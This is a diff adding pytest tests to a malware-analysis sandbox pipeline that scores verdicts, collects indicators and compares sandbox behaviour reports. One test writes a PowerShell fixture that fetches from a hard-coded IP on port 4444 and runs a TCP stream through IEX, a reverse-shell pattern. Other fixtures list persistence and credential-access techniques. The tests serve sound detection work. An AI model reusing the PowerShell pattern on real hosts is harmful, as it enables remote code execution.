@@ -409,3 +409,167 @@ def test_desktop_notification_safe_env_passing(tmp_path, monkeypatch):
     job.state["options"]["notify"] = False
     pipeline._maybe_notify_job(job)
     assert seen == []
+
+
+def test_e1_yara_spoof_format_and_high_static_score_trigger_red(tmp_path):
+    # (a) Critical YARA match -> red even if VT & sandbox didn't run or are clean
+    j1 = bare_job(tmp_path / "a")
+    j1.state["static"] = [{"rel": "x.exe", "risk_score": 40, "signature": {"status": "NotSigned"},
+                           "yara_matches": [{"rule": "SafeBox_Ransomware_Shadow_Delete", "severity": "critical", "description": "Ransom"}]}]
+    pipeline.compute_verdict(j1)
+    assert j1.state["verdict"]["level"] == "red"
+    assert any("YARA [SafeBox_Ransomware_Shadow_Delete]" in r for r in j1.state["verdict"]["red"])
+
+    # (b) High/Critical spoof_flags -> red
+    j2 = bare_job(tmp_path / "b")
+    j2.state["static"] = [{"rel": "f.pdf.exe", "risk_score": 35, "signature": {"status": "NotSigned"},
+                           "spoof_flags": [{"type": "double_ext", "severity": "high", "reason": "Çift uzantı"}]}]
+    pipeline.compute_verdict(j2)
+    assert j2.state["verdict"]["level"] == "red"
+    assert any("Çift uzantı" in r for r in j2.state["verdict"]["red"])
+
+    # (c) High format_findings -> red
+    j3 = bare_job(tmp_path / "c")
+    j3.state["static"] = [{"rel": "doc.pdf", "risk_score": 25, "signature": {"status": "NotSigned"},
+                           "format_findings": [{"category": "Şüpheli PDF Eylemi", "severity": "high", "description": "/OpenAction /JavaScript"}]}]
+    pipeline.compute_verdict(j3)
+    assert j3.state["verdict"]["level"] == "red"
+
+    # (d) Unsigned file with risk_score >= 75 -> red
+    j4 = bare_job(tmp_path / "d")
+    j4.state["static"] = [{"rel": "drop.exe", "risk_score": 80, "signature": {"status": "NotSigned"}}]
+    pipeline.compute_verdict(j4)
+    assert j4.state["verdict"]["level"] == "red"
+    assert any("80/100" in r for r in j4.state["verdict"]["red"])
+
+
+def test_e2_collect_iocs_uses_nested_hashes_sha256_and_interesting_ips(tmp_path):
+    import analyzer
+    sample = tmp_path / "c2_sample.ps1"
+    sample.write_text(
+        "Invoke-RestMethod http://185.220.101.5:4444/gate\n"
+        "New-Object System.Net.Sockets.TCPClient; GetStream; IEX $c\n",
+        encoding="utf-8",
+    )
+    st_res = analyzer.analyze_single_file(str(sample), {"status": "NotSigned", "signer": "", "message": "", "issuer": ""})
+    st_res["rel"] = "c2_sample.ps1"
+    expected_sha = st_res["hashes"]["sha256"].lower()
+
+    job = bare_job(tmp_path / "job")
+    job.state["static"] = [st_res]
+
+    iocs = pipeline.collect_iocs(job)
+    sha_iocs = [i for i in iocs if i["type"] == "sha256" and i["value"] == expected_sha]
+    assert len(sha_iocs) == 1
+    assert "static" in sha_iocs[0]["source"]
+    assert sha_iocs[0]["malicious"] is True
+    assert "SafeBox_Reverse_Shell_PowerShell" in sha_iocs[0]["classification"]
+    assert any(i["type"] == "ipv4" and i["value"] == "185.220.101.5" for i in iocs)
+
+
+def test_e3_and_e12_new_behavior_fields_in_verdict_report_and_compare(tmp_path):
+    beh = {
+        "Files": {
+            "NewCount": 1, "ModifiedCount": 1,
+            "NewExecutables": [r"C:\Users\WDAGUtilityAccount\AppData\Local\Temp\drop.exe"],
+            "ModifiedExecutables": [r"C:\Windows\System32\calc.exe"],
+            "DroppedHashes": [{"Path": r"C:\Temp\d.exe", "SHA256": "a" * 64, "Size": 123, "SigStatus": "NotSigned", "Entropy": 7.6, "Flags": ["Telegram Bot API"]}],
+        },
+        "Persistence": {
+            "Services": [], "Drivers": [], "Tasks": [], "RunKeys": [], "Startup": [],
+            "WmiSubscriptions": ["Filter: Evil -> Consumer: Cmd"],
+            "ComHijacks": ["CLSID {1111} -> evil.dll"],
+            "AppInitDlls": ["evil.dll"],
+            "BitsJobs": ["EvilBitsJob"],
+            "PsProfiles": [r"C:\Users\u\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"],
+            "ActiveSetup": ["ActiveSetupTest"],
+        },
+        "Defender": {"ThreatsDetected": [], "Added": []},
+        "Hosts": {"Added": [], "Removed": ["127.0.0.1 license.example.com"]},
+        "Firewall": {"Added": []},
+        "HoneyfileAlerts": ["Documents\\kredi_kartlari.txt (Modified)"],
+        "Processes": [],
+        "Network": {"Connections": [], "DnsCache": [], "NewListening": ["0.0.0.0:4444 (PID 999 evil.exe)"]},
+        "LanBlock": {"Requested": True, "Applied": True, "Tampered": False, "Details": [], "Status": "ok"},
+    }
+    clean = pipeline.sanitize_sandbox_json(beh)
+    assert clean["Files"]["ModifiedExecutables"] == [r"C:\Windows\System32\calc.exe"]
+    assert clean["Network"]["NewListening"] == ["0.0.0.0:4444 (PID 999 evil.exe)"]
+    assert clean["Hosts"]["Removed"] == ["127.0.0.1 license.example.com"]
+    assert clean["HoneyfileAlerts"] == ["Documents\\kredi_kartlari.txt (Modified)"]
+    assert clean["Persistence"]["WmiSubscriptions"] == ["Filter: Evil -> Consumer: Cmd"]
+    assert clean["Persistence"]["BitsJobs"] == ["EvilBitsJob"]
+
+    base = bare_job(tmp_path / "base")
+    base.state["behavior"] = pipeline.sanitize_sandbox_json({})
+    target = bare_job(tmp_path / "target")
+    target.state["behavior"] = clean
+    target.output_dir.mkdir(parents=True, exist_ok=True)
+    (target.output_dir / "procmon_summary.json").write_text(
+        json.dumps({"TotalEvents": 50, "SensitiveEvents": ["lsass.exe read by evil.exe"]}),
+        encoding="utf-8",
+    )
+
+    pipeline.compute_verdict(target)
+    v = target.state["verdict"]
+    assert v["level"] == "red"
+    red_txt = "\n".join(v["red"])
+    note_txt = "\n".join(v["notes"])
+    assert "çalıştırılabilir dosya değiştirildi" in red_txt
+    assert "dinleyici (listening) TCP portu" in red_txt
+    assert "honeyfile" in red_txt
+    assert "WMI" in red_txt
+    assert "AppInit_DLLs" in red_txt
+    assert "BITS" in red_txt
+    assert "PowerShell profil" in red_txt
+    assert "Procmon" in red_txt
+    assert "Telegram Bot API" in red_txt
+    assert "hosts dosyasından" in note_txt
+    assert "COM hijacking" in note_txt
+
+    pipeline.write_report(target)
+    rep = (target.case_dir / "report.md").read_text(encoding="utf-8")
+    assert "0.0.0.0:4444" in rep
+    assert "calc.exe" in rep
+    assert "honeyfile" in rep.lower()
+
+    diff = pipeline.compare_jobs(base, target)
+    bd = diff["behavior_diff"]
+    assert bd["modified_executables"] == [r"C:\Windows\System32\calc.exe"]
+    assert bd["new_listening"] == ["0.0.0.0:4444 (PID 999 evil.exe)"]
+    assert bd["hosts_removed"] == ["127.0.0.1 license.example.com"]
+    assert bd["wmi_subscriptions"] == ["Filter: Evil -> Consumer: Cmd"]
+    assert bd["honeyfile_alerts"] == ["Documents\\kredi_kartlari.txt (Modified)"]
+
+
+def test_network_summary_quic_udp_and_doh(tmp_path, monkeypatch):
+    pcap = tmp_path / "cap.pcap"
+    pcap.write_bytes(b"pcap")
+    monkeypatch.setattr(sbm, "tshark_path", lambda: "tshark.exe")
+
+    def fake_tshark(tshark, p, flt, fields):
+        if flt == "dns.flags.response == 0":
+            return [["dns.google"], ["c2.unknown.example"]]
+        if flt == "dns.flags.response == 1":
+            return [["c2.unknown.example", "185.10.20.30", ""]]
+        if flt == "tls.handshake.type == 1":
+            return [["dns.google", "8.8.8.8", "", "443"]]
+        if flt.startswith("quic"):
+            return [["quic-c2.example", "45.5.6.7", "", "443"]]
+        if flt.startswith("udp"):
+            return [["45.5.6.7", "", "443"], ["224.0.0.251", "", "5353"]]
+        return []
+
+    monkeypatch.setattr(pipeline, "_tshark_fields", fake_tshark)
+    ns = pipeline.network_summary(pcap, None)
+    assert ns is not None
+    assert "dns.google" in ns["doh_domains"]
+    assert any(s["name"] == "quic-c2.example" for s in ns["sni"])
+    assert any(u["target"] == "45.5.6.7:443" for u in ns["udp_targets"])
+    assert all("224.0.0.251" not in u["target"] for u in ns["udp_targets"])
+
+    job = bare_job(tmp_path / "doh_job")
+    job.state["network"] = ns
+    pipeline.compute_verdict(job)
+    assert any("DNS-over-HTTPS" in n for n in job.state["verdict"]["notes"])
+
